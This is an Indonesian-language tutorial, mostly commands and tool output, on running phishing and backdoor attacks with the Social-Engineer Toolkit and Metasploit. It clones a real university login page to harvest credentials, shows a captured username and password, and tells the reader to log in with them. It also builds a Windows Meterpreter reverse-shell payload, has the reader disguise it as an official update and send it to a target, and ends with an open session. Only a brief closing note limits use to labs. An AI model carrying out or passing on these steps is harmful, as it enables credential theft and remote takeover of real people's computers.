# Eksploitasi dengan Metasploit + Social Engineering Toolkit (SET)

## A. Apa itu Social Engineering?

[Social Engineering](https://en.wikipedia.org/wiki/Social_engineering_(security)) atau yang sering disebut soceng adalah seni memanipulasi manusia agar memberikan informasi sensitif atau menjalankan tindakan tertentu.

Contoh serangan social engineering:

- Phishing (email atau website palsu)
- Fake update (pembaruan sistem palsu)
- USB drop (menyebar USB yang berisi malware)
- Malicious file (file berbahaya seperti `PDF`, `EXE`, atau `DOCX`)

## B. Instalasi dan Setup

1. Install SET (Social Engineering Toolkit):

   ```
   sudo apt update
   sudo apt install set
   ```

2. Setup dan jalankan Metasploit:

   ```
   msfdb init
   msfconsole
   ```
   
   > Kalau belum diinstal Metasploit-nya, instal dengan: `sudo apt-get install metasploit-framework`

## C. Skema Serangan Umum

Contoh skenario:

- Penyerang membuat situs phishing kloning (fake login page) menggunakan `SET`.
- Tautan palsu dikirim melalui email yang menyamar sebagai aplikasi populer.
- Korban membuka tautan dan mengisi data login di situs palsu tersebut.
- Alternatif lain: korban diminta mengunduh `update sistem` palsu yang ternyata berisi `backdoor`.

## D. Praktik: Phishing

1. Jalankan tool SET:

   ```
   sudo setoolkit
   ```

   Tunggu sampai muncul menu utama dari tool SET:

   ```
      It's easy to update using the PenTesters Framework! (PTF)
   Visit https://github.com/trustedsec/ptf to update all your tools!


    Select from the menu:

      1) Social-Engineering Attacks
      2) Penetration Testing (Fast-Track)
      3) Third Party Modules
      4) Update the Social-Engineer Toolkit
      5) Update SET configuration
      6) Help, Credits, and About

     99) Exit the Social-Engineer Toolkit

   set> 
   ```

2. Ini merupakan menu utama dari tool SET. Untuk melakukan serangan phishing pilih menu nomer `1` yaitu `Social-Engineering Attacks`:

   ```
      It's easy to update using the PenTesters Framework! (PTF)
   Visit https://github.com/trustedsec/ptf to update all your tools!


    Select from the menu:

      1) Social-Engineering Attacks
      2) Penetration Testing (Fast-Track)
      3) Third Party Modules
      4) Update the Social-Engineer Toolkit
      5) Update SET configuration
      6) Help, Credits, and About

     99) Exit the Social-Engineer Toolkit

   set> 
   ```

3. Setelah masuk ke dalam menu `Social-Engineering Attacks`, langkah selanjutnya pilih menu nomer `2` yaitu `Website Attack Vectors`:

   ```
      It's easy to update using the PenTesters Framework! (PTF)
   Visit https://github.com/trustedsec/ptf to update all your tools!


    Select from the menu:

      1) Java Applet Attack Method
      2) Metasploit Browser Exploit Method
      3) Credential Harvester Attack Method
      4) Tabnabbing Attack Method
      5) Web Jacking Attack Method
      6) Multi-Attack Web Method
      7) HTA Attack Method

     99) Return to Main Menu

   set:webattack>
   ```

4. Pada menu ini kita pilih menu nomer `3` yaitu `Credential Harvester Attack Method`:

   ```
    The first method will allow SET to import a list of pre-defined web
    applications that it can utilize within the attack.

    The second method will completely clone a website of your choosing
    and allow you to utilize the attack vectors within the completely
    same web application you were attempting to clone.

    The third method allows you to import your own website, note that you
    should only have an index.html when using the import website
    functionality.
   
      1) Web Templates
      2) Site Cloner
      3) Custom Import

     99) Return to Webattack Menu

   set:webattack>
   ```

5. Pada menu ini kita pilih menu nomer `2` yaitu `Site Cloner`:

   ```
   [-] Credential harvester will allow you to utilize the clone capabilities within SET
   [-] to harvest credentials or parameters from a website as well as place them into a report

   -------------------------------------------------------------------------------
   --- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

   The way that this works is by cloning a site and looking for form fields to
   rewrite. If the POST fields are not usual methods for posting forms this 
   could fail. If it does, you can always save the HTML, rewrite the forms to
   be standard forms and use the "IMPORT" feature. Additionally, really 
   important:

   If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
   IP address below, not your NAT address. Additionally, if you don't know
   basic networking concepts, and you have a private IP address, you will
   need to do port forwarding to your NAT IP address from your external IP
   address. A browser doesn’t know how to communicate with a private IP
   address, so if you don't specify an external IP address if you are using
   this from an external perspective, it will not work. This isn't a SET issue
   this is how networking works.

   set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.42]:
   ```

6. Pada tahap ini, kita diminta untuk memasukkan alamat IP yang akan digunakan sebagai tujuan `POST back`. Kamu bisa langsung menekan `Enter` untuk menggunakan alamat IP default (yang terdeteksi otomatis):

   ```
   [-] SET supports both HTTP and HTTPS
   [-] Example: http://www.thisisafakesite.com
   set:webattack> Enter the url to clone: 
   ```

7. Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. di sini sebagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia):

   ```
   set:webattack> Enter the url to clone: https://penerimaan.ui.ac.id/login

   [*] Cloning the website: https://penerimaan.ui.ac.id/login
   [*] This could take a little bit...

   The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
   [*] The Social-Engineer Toolkit Credential Harvester Attack
   [*] Credential Harvester is running on port 80
   [*] Information will be displayed to you as it arrives below:
   ```

8. Tahap selanjutnya adalah mengirim tautan phishing kepada target, misalnya melalui `email` atau `pesan instan`. Tunggu sampai korban memasukkan `username/email` dan `password` yang benar:

   ```
   [*] WE GOT A HIT! Printing the output:
   POSSIBLE USERNAME FIELD FOUND: username=adminui@ui.ac.id
   POSSIBLE PASSWORD FIELD FOUND: password=adminui123
   PARAM: s=LOGIN
   PARAM: csrf_token=3e5281c44fe387ed6cc384978fd1257d82d501dc5147e86766fc578b3cf0e6ea
   [*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
   ```

   Boom...! Selamat kamu sudah mendapatkan `username/email` dan `password` yang benar. Sekarang kamu bisa login ke website SIMAK UI dengan kredensial tersebut:

   ```
   username=adminui@ui.ac.id
   password=adminui123
   ```

## E. Praktik: Reverse Shell

1. Jalankan tool SET:

   ```
   sudo setoolkit

   ```

2. Pilih menu nomor `1`:

   ```
   Visit: https://www.trustedsec.com

      It's easy to update using the PenTesters Framework! (PTF)
   Visit https://github.com/trustedsec/ptf to update all your tools!


    Select from the menu:

      1) Social-Engineering Attacks
      2) Penetration Testing (Fast-Track)
      3) Third Party Modules
      4) Update the Social-Engineer Toolkit
      5) Update SET configuration
      6) Help, Credits, and About

     99) Exit the Social-Engineer Toolkit
   ```

3. Pilih menu nomor `4`:

   ```
   It's easy to update using the PenTesters Framework! (PTF)
   Visit https://github.com/trustedsec/ptf to update all your tools!


    Select from the menu:

      1) Spear-Phishing Attack Vectors
      2) Website Attack Vectors
      3) Infectious Media Generator
      4) Create a Payload and Listener
      5) Mass Mailer Attack
      6) Arduino-Based Attack Vector
      7) Wireless Access Point Attack Vector
      8) QRCode Generator Attack Vector
      9) Powershell Attack Vectors
     10) Third Party Modules

     99) Return back to the main menu.

   set> 
   ```

4. Pilih menu nomor `4`:

   > knp menu nomor 4? karena biar kita bisa masuk ke sesi Meterpreter-nya. dimana kita bisa banyak melakukan banyak hal didalamnya.
   
   ```
      1) Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker
      2) Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker
      3) Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker
      4) Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline
      5) Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter
      6) Windows Meterpreter Egress Buster       Spawn a Meterpreter shell and find a port home via multiple ports
      7) Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter
      8) Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and use Reverse Meterpreter
      9) Download/Run your Own Executable        Downloads an executable and runs it

   set:payloads>
   ```

5. Masukkan alamat IP kita:

   ```
   set:payloads> IP address for the payload listener (LHOST): 192.168.1.42
   ```

6. Masukkan nomor port untuk menerima koneksi balik:

   ```
   set:payloads> Enter the PORT for the reverse listener: 4444
   ```

7. Backdoor sudah berhasil dibuat dan disimpan di: `/root/.set/payload.exe`

   ```
   [*] Generating the payload.. please be patient.
   [*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
   set:payloads> Do you want to start the payload and listener now? (yes/no): 
   ```

8. Tools SET nanya mau menjalankan payload dan listener sekarang atau tidak, kita jawab: `yes`

   Tool SET akan menjalankan Metasploit dan menggunakan modul `exploit/multi/handler` sebagai listener (untuk menerima koneksi balik).

   Proses eksploitasi dijalankan secara backound yang ditandai dengan `resource (/root/.set/meta_config)> exploit -j`:
   
   ```
   [*] Processing /root/.set/meta_config for ERB directives.
   resource (/root/.set/meta_config)> use multi/handler
   [*] Using configured payload generic/shell_reverse_tcp
   resource (/root/.set/meta_config)> set payload windows/meterpreter/reverse_tcp
   payload => windows/meterpreter/reverse_tcp
   resource (/root/.set/meta_config)> set LHOST 192.168.1.42
   LHOST => 192.168.1.42
   resource (/root/.set/meta_config)> set LPORT 4444
   LPORT => 4444
   resource (/root/.set/meta_config)> set ExitOnSession false
   ExitOnSession => false
   resource (/root/.set/meta_config)> exploit -j
   [*] Exploit running as background job 0.
   [*] Exploit completed, but no session was created.
   [*] Starting persistent handler(s)...
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   msf6 exploit(multi/handler) >
   ```

9. Tahap selanjutnya kirim backdoor yang berhasil dibuat tadi ke target, bikin agar seolah-olah backdoor itu adalah aplikasi update dari official resmi. Tunggu sampai target membuka backddor tersebut.

   Jika target membuka backdoor tersebut kita akan mendapatkan sesi Meterpreter:

   ```
   [*] Exploit running as background job 0.
   [*] Exploit completed, but no session was created.
   [*] Starting persistent handler(s)...
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   msf6 exploit(multi/handler) > 
   [*] Sending stage (177734 bytes) to 192.168.1.45
   [*] Meterpreter session 1 opened (192.168.1.42:4444 -> 192.168.1.45:49168) at 2025-05-11 06:30:36 +0700
   ```

   Ketik `sessions` untuk melihat semua sesi yang aktif:

   ```
   [*] Sending stage (177734 bytes) to 192.168.1.45
   [*] Meterpreter session 1 opened (192.168.1.42:4444 -> 192.168.1.45:49171) at 2025-05-11 06:34:48 +0700
   sessions 

   Active sessions
   ===============

     Id  Name  Type                     Information                Connection
     --  ----  ----                     -----------                ----------
     1         meterpreter x86/windows  admin-PC\admin @ ADMIN-PC  192.168.1.42:4444 -> 192.168.1.45:49171 (192.168.1.45)

   msf6 exploit(multi/handler) >
   ```

   Dari hasil tersebut, sesi Meterpreter yang aktif memiliki ID `1`. Untuk masuk ke sesi tersebut, ketik perintah:

   ```
   session -i 1
   ```

   Tara...! Selamat kamu sudah masuk ke sesi Meterpreter-nya. Di sini kamu bisa melakukan banyak hal.
    
## F. Etika & Hukum

- Dilarang menjalankan serangan ini di dunia nyata tanpa izin tertulis.
- Praktik hanya di lab/lab simulasi.
- Tujuan pembelajaran dan pengujian keamanan.
